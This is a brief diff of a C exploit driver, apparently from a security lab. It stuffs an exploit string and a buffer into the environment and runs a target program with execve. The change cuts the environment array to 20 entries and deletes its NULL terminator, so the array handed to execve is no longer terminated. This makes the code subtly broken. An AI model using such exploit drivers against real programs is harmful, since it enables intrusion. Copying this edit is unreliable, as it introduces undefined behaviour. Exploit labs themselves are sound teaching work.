@@ -9,7 +9,7 @@
 int main(void)
 {
         char *args[3];
-        char *env[21];
+        char *env[20];
 
         char buffer[256];
         int i;
@@ -49,8 +49,7 @@ int main(void)
         env[16] = "\0";
         env[17] = "\0";
         env[18] = exploit;
-        env[19] = buffer;
-        env[20] = NULL;
+        env[19] = buffer; 
 
 	if (0 > execve(TARGET, args, env))	
 		fprintf(stderr, "execve failed.\n");
